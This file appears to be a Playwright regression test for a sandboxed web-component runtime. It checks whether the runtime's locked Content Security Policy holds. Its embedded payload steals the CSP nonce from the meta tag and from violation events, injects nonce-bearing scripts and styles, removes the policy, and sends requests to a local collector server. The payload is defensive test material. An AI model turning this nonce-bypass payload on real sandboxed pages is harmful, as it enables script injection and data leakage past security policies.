import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import { resolve } from "node:path";
import http from "node:http";
import { chromium, firefox, webkit } from "playwright";

const browserName =
  process.argv.find((value) => ["chromium", "firefox", "webkit"].includes(value)) ?? "chromium";
const expectVulnerable = process.argv.includes("--expect-vulnerable");
const distRoot = process.env.SLEXKIT_TEST_DIST && resolve(process.env.SLEXKIT_TEST_DIST);
const engine = { chromium, firefox, webkit }[browserName];
const collectorHits = [];

function listen(server) {
  return new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
}
function close(server) {
  return new Promise((resolve, reject) =>
    server.close((error) => (error ? reject(error) : resolve())),
  );
}

const collector = http.createServer((request, response) => {
  const path = new URL(request.url, "http://localhost").pathname;
  collectorHits.push(path);
  response.setHeader("access-control-allow-origin", "*");
  response.setHeader("cache-control", "no-store");
  if (path.endsWith("-script")) {
    response.setHeader("content-type", "text/javascript");
    response.end("document.documentElement.dataset.externalScriptRan='yes'");
  } else if (path.endsWith("-style")) {
    response.setHeader("content-type", "text/css");
    response.end("#external-style-probe{color:rgb(1,2,3)}");
  } else if (path === "/navigation") {
    response.setHeader("content-type", "text/html");
    response.end("<!doctype html><title>navigated</title>");
  } else {
    response.statusCode = 204;
    response.end();
  }
});
await listen(collector);
const collectorOrigin = `http://127.0.0.1:${collector.address().port}`;

const assetServer = http.createServer(async (request, response) => {
  const path = new URL(request.url, "http://localhost").pathname;
  response.setHeader("access-control-allow-origin", "*");
  response.setHeader("cache-control", "no-store");
  if (path === "/host") {
    response.setHeader("content-type", "text/html");
    response.end("<!doctype html><main id='root'></main>");
    return;
  }
  if (path === "/dist/slexkit.js") {
    response.setHeader("content-type", "text/javascript");
    response.end(await readFile(distRoot ? resolve(distRoot, "slexkit.js") : new URL("../../dist/slexkit.js", import.meta.url)));
    return;
  }
  if (path === "/dist/slexkit.css") {
    response.setHeader("content-type", "text/css");
    response.end(await readFile(distRoot ? resolve(distRoot, "slexkit.css") : new URL("../../dist/slexkit.css", import.meta.url)));
    return;
  }
  response.statusCode = 404;
  response.end("missing");
});
await listen(assetServer);
const assetOrigin = `http://127.0.0.1:${assetServer.address().port}`;

const payload = `<style>#custom-style{color:rgb(12, 34, 56)} #external-style-probe{display:block}</style>
<p id="custom-style">custom style</p><p id="external-style-probe">external style probe</p>
<slex-input id="control" value="12"></slex-input>
<slex-text id="attribute-text" text="Visible text"></slex-text>
<slex-badge id="attribute-badge" text="Visible badge"></slex-badge>
<script>
const collector = ${JSON.stringify(collectorOrigin)};
const originalRevoke = URL.revokeObjectURL.bind(URL);
globalThis.__styleLifecycleRevocations = [];
URL.revokeObjectURL = url => { globalThis.__styleLifecycleRevocations.push(url); originalRevoke(url); };
const evidence = { elementNonce: document.querySelector("script[nonce]")?.nonce || "", metaNonce: "", eventNonce: "" };
const firstPolicy = document.querySelector('meta[http-equiv="Content-Security-Policy" i]')?.content || "";
evidence.metaNonce = firstPolicy.match(/'nonce-([^']+)'/)?.[1] || "";
globalThis.__cspEvidence = evidence;
const addScript = (path, nonce) => { const node=document.createElement("script");node.src=collector+path;if(nonce)node.nonce=nonce;document.head.append(node); };
const addStyle = (path, nonce) => { const node=document.createElement("link");node.rel="stylesheet";node.href=collector+path;if(nonce)node.nonce=nonce;document.head.append(node); };
addEventListener("securitypolicyviolation", event => {
  if (evidence.eventNonce) return;
  evidence.eventNonce = event.originalPolicy?.match(/'nonce-([^']+)'/)?.[1] || "";
  if (evidence.eventNonce) { addScript("/nonce-event-script", evidence.eventNonce); addStyle("/nonce-event-style", evidence.eventNonce); }
});
fetch(collector+"/raw-connect").catch(()=>{});
const image=new Image();image.src=collector+"/raw-image";document.body.append(image);
try { new FontFace("blocked", "url("+collector+"/raw-font)").load().catch(()=>{}); } catch {}
addScript("/raw-script", ""); addStyle("/raw-style", "");
addScript("/nonce-element-script", evidence.elementNonce); addStyle("/nonce-element-style", evidence.elementNonce);
addScript("/nonce-meta-script", evidence.metaNonce); addStyle("/nonce-meta-style", evidence.metaNonce);
for (const meta of document.querySelectorAll('meta[http-equiv="Content-Security-Policy" i]')) meta.remove();
addScript("/nonce-removed-meta-script", evidence.metaNonce); addStyle("/nonce-removed-meta-style", evidence.metaNonce);
</script>`;

const browserServer = await engine.launchServer({ headless: true });
const browser = await engine.connect(browserServer.wsEndpoint());
try {
  const page = await browser.newPage();
  page.setDefaultTimeout(12_000);
  await page.goto(`${assetOrigin}/host`);
  await page.evaluate(
    async ({ source, runtimeUrl, styleUrl }) => {
      const runtime = await import(runtimeUrl);
      globalThis.handle = runtime.mount(source, document.querySelector("#root"), {
        secureFrame: { runtimeUrl, styleUrl },
      });
      await globalThis.handle.ready;
    },
    {
      source: payload,
      runtimeUrl: `${assetOrigin}/dist/slexkit.js`,
      styleUrl: `${assetOrigin}/dist/slexkit.css`,
    },
  );

  const frame = page.frameLocator("#root iframe");
  await frame.locator("#control").waitFor();
  assert.equal(await frame.locator("#attribute-text .slex-text").innerText(), "Visible text");
  assert.equal(await frame.locator("#attribute-badge .slex-badge-label").innerText(), "Visible badge");
  assert.equal(
    await frame.locator("#control").evaluate((node) => getComputedStyle(node).display),
    "block",
    "the sandbox CSP must allow the trusted custom-element base stylesheet",
  );
  await page.waitForTimeout(800);
  const nonceEvidence = await frame.locator("html").evaluate(() => globalThis.__cspEvidence);
  assert.ok(
    nonceEvidence.metaNonce,
    "the payload should recover the bootstrap nonce from the DOM CSP meta before removing it",
  );
  assert.ok(
    nonceEvidence.eventNonce,
    "the payload should recover the bootstrap nonce from SecurityPolicyViolationEvent.originalPolicy",
  );
  assert.equal(
    await frame.locator("#custom-style").evaluate((node) => getComputedStyle(node).color),
    "rgb(12, 34, 56)",
  );
  const styleSheetsBeforeStyleUpdate = await frame
    .locator("html")
    .evaluate(() => document.adoptedStyleSheets.length);
  await page.evaluate(
    (source) => globalThis.handle.update(source),
    payload.replace("rgb(12, 34, 56)", "rgb(22, 44, 66)"),
  );
  assert.equal(
    await frame.locator("#custom-style").evaluate((node) => getComputedStyle(node).color),
    "rgb(22, 44, 66)",
  );
  assert.equal(
    await frame.locator("html").evaluate(() => document.adoptedStyleSheets.length),
    styleSheetsBeforeStyleUpdate,
    "replacing payload CSS must release its previous constructed sheet without accumulating sheets",
  );
  assert.ok(
    await frame
      .locator("#control")
      .evaluate((node) => !!node.shadowRoot?.querySelector('link[rel="stylesheet"]')?.sheet),
    "the approved component stylesheet should load inside shadow DOM",
  );
  await frame.locator("#control").evaluate((node) => {
    node.value = "37";
  });
  await page.evaluate(() => globalThis.handle.reset());
  assert.equal(await frame.locator("#control").evaluate((node) => node.value), "12");

  const nonceBypasses = collectorHits.filter((path) => path.startsWith("/nonce-"));
  if (expectVulnerable) {
    assert.ok(
      nonceBypasses.some((path) => path.endsWith("-script")),
      "the pre-hardening runtime should reproduce a nonce script bypass",
    );
    assert.ok(
      nonceBypasses.some((path) => path.endsWith("-style")),
      "the pre-hardening runtime should reproduce a nonce style bypass",
    );
  } else {
    for (const blocked of [
      "/raw-connect",
      "/raw-image",
      "/raw-font",
      "/raw-script",
      "/raw-style",
      "/nonce-element-script",
      "/nonce-element-style",
      "/nonce-meta-script",
      "/nonce-meta-style",
      "/nonce-event-script",
      "/nonce-event-style",
      "/nonce-removed-meta-script",
      "/nonce-removed-meta-style",
    ])
      assert.ok(
        !collectorHits.includes(blocked),
        `${blocked} reached the collector despite the locked CSP`,
      );
  }

  await page.evaluate(
    (navigationUrl) =>
      globalThis.handle.update(`<script>location.href=${JSON.stringify(navigationUrl)}</script>`),
    `${collectorOrigin}/navigation`,
  );
  await page.waitForTimeout(500);
  assert.ok(
    collectorHits.includes("/navigation"),
    "self-navigation is a measured sandbox/CSP limitation and should stay documented",
  );
  console.log(
    JSON.stringify(
      {
        browserName,
        expectVulnerable,
        nonceBypasses,
        navigationReachedCollector: true,
        collectorHits,
      },
      null,
      2,
    ),
  );
} finally {
  await browser.close();
  await browserServer.close();
  await close(assetServer);
  await close(collector);
}
